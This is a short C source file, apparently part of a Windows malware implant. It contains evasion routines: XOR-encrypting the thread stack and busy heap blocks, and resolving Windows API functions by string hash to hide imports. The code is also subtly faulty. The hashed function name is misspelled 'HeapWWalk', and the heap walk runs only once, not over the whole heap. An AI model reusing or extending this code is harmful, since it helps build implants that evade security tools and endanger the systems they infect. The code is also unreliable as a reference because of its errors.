#include <common.h>

FUNC VOID XorStack(
    PVOID StackBase,
    PVOID StackLimit
) {
    for ( PUCHAR Ptr = StackLimit; Ptr < StackBase; Ptr++ ) {
        *Ptr ^= 0xFF;
    }
}

FUNC VOID XorCipher(
    _In_ PBYTE  pBinary, 
    _In_ UINT64 sSize, 
    _In_ PBYTE  pbKey, 
    _In_ UINT64 sKeySize
) {
    for (SIZE_T i = 0x00, j = 0x00; i < sSize; i++, j++) {
        if (j == sKeySize)
            j = 0x00;

        if (i % 2 == 0)
            pBinary[i] = pBinary[i] ^ pbKey[j];
        else
            pBinary[i] = pBinary[i] ^ pbKey[j] ^ j;
    }
}

FUNC VOID HeapObf( 
    PVOID Heap
) {
    BLACKOUT_INSTANCE

    PROCESS_HEAP_ENTRY HeapEntry   = { 0 };
    BYTE               HeapKey[16] = { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };

    MmZero( &HeapEntry, sizeof( PROCESS_HEAP_ENTRY ) );

    typedef WINBOOL (*fHeapWalk)(HANDLE hHeap, LPPROCESS_HEAP_ENTRY lpEntry);
    fHeapWalk pHeapWalk = LdrFuncAddr( LdrModuleAddr( HASH_STR( "KERNEL32.DLL" ) ), HASH_STR( "HeapWWalk" ) );

    pHeapWalk( Heap, &HeapEntry );
    if ( HeapEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY ) {
        XorCipher( HeapEntry.lpData, HeapEntry.cbData, HeapKey, sizeof(HeapKey) );
    }
}
